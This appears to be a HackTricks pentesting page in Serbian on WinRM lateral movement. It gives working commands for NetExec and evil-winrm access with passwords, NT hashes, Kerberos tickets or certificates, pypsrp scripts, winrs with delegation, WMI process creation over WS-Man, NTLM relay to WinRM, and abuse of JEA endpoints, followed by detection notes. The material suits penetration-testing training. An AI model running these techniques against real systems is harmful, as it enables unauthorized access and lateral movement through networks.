# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM je jedan od najpraktičnijih transportnih protokola za **lateral movement** u Windows okruženjima, jer omogućava udaljenu ljusku preko **WS-Man/HTTP(S)** bez trikova sa kreiranjem SMB servisa. Ako cilj izlaže **5985/5986** i vaš principal ima dozvolu za korišćenje remoting-a, često možete veoma brzo da pređete sa „važećih kredencijala“ na „interaktivnu ljusku“.

Za **enumeraciju protokola/servisa**, listenere, omogućavanje WinRM-a, `Invoke-Command` i opštu upotrebu klijenata, pogledajte:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Zašto operateri vole WinRM

- Koristi **HTTP/HTTPS** umesto SMB/RPC-a, pa često radi tamo gde je izvršavanje u stilu PsExec-a blokirano.
- Uz **Kerberos**, izbegava slanje kredencijala koji se mogu ponovo koristiti na cilj.
- Dobro radi sa alatima za **Windows**, **Linux** i **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Interaktivni PowerShell remoting pokreće **`wsmprovhost.exe`** na cilju u kontekstu autentifikovanog korisnika, što se operativno razlikuje od izvršavanja zasnovanog na servisima.

## Model pristupa i preduslovi

U praksi, uspešan WinRM lateral movement zavisi od **tri** stvari:

1. Cilj ima **WinRM listener** (`5985`/`5986`) i firewall pravila koja dozvoljavaju pristup.
2. Nalog može da se **autentifikuje** na endpoint.
3. Nalog ima dozvolu da **otvori remoting sesiju**.

Uobičajeni načini za sticanje tog pristupa:

- **Local Administrator** na cilju.
- Članstvo u grupi **Remote Management Users** na novijim sistemima ili **WinRMRemoteWMIUsers__** na sistemima/komponentama koje i dalje podržavaju tu grupu.
- Eksplicitna prava za remoting dodeljena preko lokalnih security descriptor-a / izmena PowerShell remoting ACL-ova.

Ako već imate kontrolu nad računarom sa administratorskim pravima, imajte na umu da možete i da **delegirate WinRM pristup bez članstva u administratorskoj grupi** koristeći tehnike opisane ovde:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Važne zamke pri autentifikaciji tokom lateral movement-a

- **Kerberos zahteva hostname/FQDN**. Ako se povezujete preko IP adrese, klijent se obično vraća na **NTLM/Negotiate**.
- U **workgroup** okruženjima ili slučajevima sa međudomenskim poverenjem, NTLM često zahteva ili **HTTPS** ili dodavanje cilja u **TrustedHosts** na klijentu.
- Kod korišćenja lokalnih naloga preko Negotiate-a u workgroup okruženju, UAC ograničenja za udaljeni pristup mogu da spreče pristup, osim ako se koristi ugrađeni Administrator nalog ili `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting podrazumevano koristi **`HTTP/<host>` SPN**. U okruženjima gde je **`HTTP/<host>`** već registrovan za neki drugi service account, WinRM Kerberos može da ne uspe uz grešku `0x80090322`; koristite SPN sa navedenim portom ili pređite na **`WSMAN/<host>`** ako taj SPN postoji.<sup>[[3]](#references)</sup>

Ako dođete do važećih kredencijala tokom password spraying-a, njihova provera preko WinRM-a često je najbrži način da utvrdite da li vam omogućavaju pristup ljusci:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement sa Linux-a na Windows

### NetExec / CrackMapExec za proveru i jednokratno izvršavanje

```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```

### Evil-WinRM za interaktivne shell-ove

`evil-winrm` je i dalje najpraktičnija interaktivna opcija iz Linux okruženja jer podržava **lozinke**, **NT hash-eve**, **Kerberos tikete**, **klijentske sertifikate**, prenos datoteka i učitavanje PowerShell/.NET-a u memoriju.

```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```

### Kerberos SPN izuzetan slučaj: `HTTP` vs `WSMAN`

Kada podrazumevani **`HTTP/<host>`** SPN izaziva Kerberos greške, pokušajte da zatražite/koristite ticket **`WSMAN/<host>`**. Do ovoga može doći u ojačanim ili neuobičajenim enterprise okruženjima u kojima je **`HTTP/<host>`** već dodeljen drugom service account-u.<sup>[[3]](#references)</sup>

```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```

Ovo je korisno i nakon zloupotrebe **RBCD / S4U**, kada ste konkretno falsifikovali ili zatražili servisnu kartu **WSMAN**, a ne generičku kartu `HTTP`.

### Autentifikacija zasnovana na sertifikatu

WinRM podržava i **autentifikaciju klijentskim sertifikatom**, ali sertifikat mora biti mapiran na ciljnom sistemu na **lokalni nalog**. Iz ofanzivne perspektive, ovo je važno kada:

- ste ukrali/izvezli važeći klijentski sertifikat i privatni ključ koji su već mapirani za WinRM;
- ste zloupotrebili **AD CS / Pass-the-Certificate** da biste pribavili sertifikat za principal, a zatim prešli na drugi put autentifikacije;
- radite u okruženjima koja namerno izbegavaju udaljeni pristup zasnovan na lozinkama.

```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```

Client-certificate WinRM je mnogo ređi od password/hash/Kerberos autentifikacije, ali kada postoji, može da obezbedi putanju za **kretanje kroz mrežu bez lozinke** koja ostaje funkcionalna i nakon promene lozinke.

### Python / automatizacija pomoću `pypsrp`

Ako vam je potrebna automatizacija umesto operatorskog shell-a, `pypsrp` omogućava korišćenje WinRM/PSRP-a iz Pythona uz podršku za **NTLM**, **certificate auth**, **Kerberos** i **CredSSP**.<sup>[[2]](#references)</sup>

```python
from pypsrp.client import Client

client = Client(
    "srv01.domain.local",
    username="DOMAIN\\user",
    password="Password123!",
    ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```


Ako vam je potrebna preciznija kontrola nego što pruža wrapper višeg nivoa `Client`, API-ji nižeg nivoa `WSMan` + `RunspacePool` korisni su za rešavanje dva česta problema operatora:

- forsiranje **`WSMAN`** kao Kerberos servisa/SPN-a umesto podrazumevanog očekivanja **`HTTP`** koje koriste mnogi PowerShell klijenti;
- povezivanje sa **PSRP endpointom koji nije podrazumevani**, kao što je **JEA** / prilagođena konfiguracija sesije, umesto sa `Microsoft.PowerShell`.

```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
    "srv01.domain.local",
    auth="kerberos",
    ssl=False,
    negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
    ps.add_script("whoami; Get-Command")
    output = ps.invoke()
    print(output)
```

### Prilagođene PSRP krajnje tačke i JEA su važne tokom lateralnog kretanja

Uspešna WinRM autentifikacija **ne** znači uvek da ćete završiti na podrazumevanoj, neograničenoj krajnjoj tački `Microsoft.PowerShell`. Zrela okruženja mogu da izlože **prilagođene konfiguracije sesija** ili krajnje tačke JEA sa sopstvenim ACL-ovima i ponašanjem run-as.<sup>[[1]](#references)</sup>

Ako već imate izvršavanje koda na Windows hostu i želite da utvrdite koje površine za udaljeni pristup postoje, izlistajte registrovane krajnje tačke:

```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```

Kada postoji koristan endpoint, ciljajte ga eksplicitno umesto podrazumevanog shell-a:

```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```

Praktične ofanzivne implikacije:

- **Ograničeni** endpoint i dalje može biti dovoljan za lateral movement ako izlaže baš one cmdlet-e/funkcije koji su potrebni za kontrolu servisa, pristup datotekama, kreiranje procesa ili proizvoljno izvršavanje .NET / eksternih komandi.
- **Pogrešno konfigurisan JEA** role je naročito vredan ako izlaže opasne komande kao što su `Start-Process`, široki džokeri, upisivi provideri ili prilagođene proxy funkcije koje vam omogućavaju da zaobiđete predviđena ograničenja.
- Endpoint-i koji koriste **RunAs virtuelne naloge** ili **gMSA** menjaju efektivni bezbednosni kontekst komandi koje pokrećete. Konkretno, endpoint koji koristi gMSA može da obezbedi **mrežni identitet pri drugom hop-u**, čak i kada bi uobičajena WinRM sesija naišla na klasičan problem delegiranja.

Kod prilagođenog ograničenog endpoint-a, odvojeno proverite efektivne dozvole za komande i skripte: kratak spisak iz `Get-Command` sam po sebi ne dokazuje da postojeći `.ps1` ne može da se pokrene. [JEA role capabilities](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) izričito određuju koje putanje skripti mogu da se pozivaju; drugi prilagođeni endpoint-i mogu da primenjuju drugačija pravila sesije. Ako dozvoljena skripta koristi sačuvani `SecureString` za kreiranje akreditiva za drugi host, blob napravljen bez eksplicitnog ključa koristi [Windows DPAPI](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) i za dešifrovanje mu je obično potreban kontekst korisnika i računara koji su ga zaštitili. Pre nego što izvor koji može da se menja ili kopirani blob tretirate kao putanju za eskalaciju između hostova, proverite ACL skripte, dozvoljeno pozivanje, identitet za RunAs i dozvole akreditiva na odredištu. Nemojte ispisivati zaštićenu vrednost tokom pasivne enumeracije.

Kod prilagođene JEA funkcije koja prihvata putanju do datoteke, zajedno proverite ACL registrovanog endpoint-a, mapirani role capability i efektivni identitet za RunAs. Pozivalac može imati `NoLanguage`, dok telo funkcije radi u podrazumevanom jezičkom režimu sistema; virtuelni nalog takođe može imati administratorske privilegije na lokalnom računaru. Ako funkcija proverava dozvoljeni direktorijum koristeći sirovi prefiks niske, a zatim čita prosleđenu putanju, komponente `..` mogu da razreše putanju izvan tog direktorijuma. Granicu čini razrešena putanja u kontekstu identiteta funkcije, a ne jezički režim pozivaoca ili prividni prefiks. Pre nego što čitljivu `.psrc` ili `.pssc` datoteku tretirate kao nalaz privilegovanog čitanja datoteka, potvrdite da je funkcija dostupna i da proverava konačnu putanju. Pogledajte Microsoft-ova uputstva za [JEA role capability](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/role-capabilities) i [bezbednosna razmatranja](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations).

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` je ugrađen alat i koristan je kada želite **izvorno WinRM izvršavanje komandi** bez otvaranja interaktivne PowerShell remoting sesije:

```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```

Dve zastavice se lako zaborave, a u praksi su važne:

- `/noprofile` je često neophodan kada udaljeni principal **nije lokalni administrator**.
- `/allowdelegate` omogućava udaljenoj ljusci da koristi vaše akreditive za pristup **trećem hostu** (na primer, kada komanda zahteva `\\fileserver\share`).

```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```

Operativno, `winrs.exe` obično dovodi do udaljenog lanca procesa sličnog sledećem:

```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```

Vredi zapamtiti jer se razlikuje od service-based exec i interaktivnih PSRP sesija.

### `winrm.cmd` / WS-Man COM umesto PowerShell remoting

Možete izvršavati komande i preko **WinRM transporta** bez korišćenja `Enter-PSSession`, pozivanjem WMI klasa preko WS-Man-a. Transport ostaje WinRM, dok primitiv za udaljeno izvršavanje postaje **WMI `Win32_Process.Create`**:

```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```

Taj pristup je koristan kada:

- PowerShell logging se intenzivno nadzire.
- Želite **WinRM transport**, ali ne i klasični PS remoting workflow.
- Pravite ili koristite prilagođene alate zasnovane na COM objektu **`WSMan.Automation`**.

## NTLM relay ka WinRM-u (WS-Man)

Kada je SMB relay blokiran potpisivanjem, a LDAP relay ograničen, **WS-Man/WinRM** i dalje može biti privlačna meta za relay. Moderni `ntlmrelayx.py` uključuje **WinRM relay servere** i može da prosleđuje relay saobraćaj ka ciljevima **`wsman://`** ili **`winrms://`**.

```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```

Dve praktične napomene:

- Relay je najkorisniji kada cilj prihvata **NTLM**, a relayed principal ima dozvolu da koristi WinRM.
- Noviji Impacket kod posebno obrađuje zahteve **`WSMANIDENTIFY: unauthenticated`**, tako da probe u stilu `Test-WSMan` ne prekidaju tok relay-a.

Za ograničenja pri višestrukim hopovima nakon uspostavljanja prve WinRM sesije, pogledajte:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## OPSEC i napomene o detekciji

- **Interactive PowerShell remoting** obično pokreće **`wsmprovhost.exe`** na cilju.
- **`winrs.exe`** obično pokreće **`winrshost.exe`**, a zatim traženi child process.
- Prilagođeni **JEA** endpoint-i mogu da izvršavaju radnje kao virtuelni nalozi **`WinRM_VA_*`** ili kao konfigurisani **gMSA**, čime se menjaju i telemetrija i ponašanje pri drugom hop-u u poređenju sa shell-om u kontekstu običnog korisnika.<sup>[[1]](#references)</sup>
- Očekujte telemetriju mrežne prijave, događaje WinRM servisa i PowerShell operational/script-block logovanje ako koristite PSRP umesto sirovog `cmd.exe`.
- Ako vam je potrebna samo jedna komanda, `winrs.exe` ili jednokratno izvršavanje preko WinRM-a mogu biti tiši od dugotrajne interaktivne remoting sesije.
- Ako je Kerberos dostupan, dajte prednost kombinaciji **FQDN + Kerberos** u odnosu na IP + NTLM da biste smanjili probleme sa poverenjem i nezgodne izmene klijentskog `TrustedHosts`.

## References

- [1] [Microsoft: Bezbednosna razmatranja za JEA](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Greška `0x80090322` pri povezivanju PowerShell-a sa udaljenim serverom preko WinRM-a](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)
{{#include ../../banners/hacktricks-training.md}}
